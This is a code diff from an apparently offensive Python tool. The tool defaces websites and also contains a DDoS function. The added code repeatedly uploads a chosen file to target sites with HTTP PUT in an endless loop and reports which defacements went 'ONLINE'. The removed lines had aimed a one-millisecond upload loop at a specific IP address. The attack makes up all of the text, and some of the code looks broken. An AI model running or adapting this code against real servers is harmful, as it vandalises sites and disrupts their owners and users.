@@ -123,7 +123,7 @@ def crawl_and_deface_links_from_file(deface_file, links_file):
         return
 
     for link in links:
-        aox(deface_file, link)
+        auto_upload_deface(script, link, interval_ms)
 
 def main(__bn__):
     print(__bn__)
@@ -227,15 +227,35 @@ def ddos():
     except KeyboardInterrupt:
         print("\nExiting DDoS...")
 
-def auto_upload(script, target_url, interval_ms):
+def auto_upload_deface(script, target_url, interval_ms):
     while True:
-        aox(script, target_url)
-        time.sleep(interval_ms / 1000)  # Convert interval to seconds
+        auto_upload(script, target_url)
+        time.sleep(interval_ms / 100)  # Convert interval to seconds
 
+def auto_upload(script, target_url):
+    try:
+        a = script
+        if not os.path.isfile(a):
+            print("File '%s' not found" % a)
+            return
+        target_url = target_url
+        op = open(a, "r").read()
+        s = requests.Session()
+        try:
+            site = target_url.strip()
+            if not site.startswith("http://"):
+                site = "http://" + site
+            req = s.put(site + "/" + a, data=op)
+            if req.status_code > 200 or req.status_code >= 250:
+                print(m + ">" + b + "[-] FAILED" + b + " %s/%s" % (site, a))
+            else:
+                print(m + ">" + h + "[+] ONLINE" + h + " %s/%s" % (site, a))
+        except requests.exceptions.RequestException:
+            print(m + ">" + b + "[-] FAILED" + b + " %s" % target_url)
+
+    except KeyboardInterrupt:
+        print()
         
 if __name__ == "__main__":
     banner = banner.replace("[⍟]", "[AUTO⍟]")
-    interval_ms = 1  # Adjust the interval in milliseconds
-    auto_upload_thread = threading.Thread(target=auto_upload, args=("index.html", "http://83.211.190.83", interval_ms))
-    auto_upload_thread.start()
     main(banner)
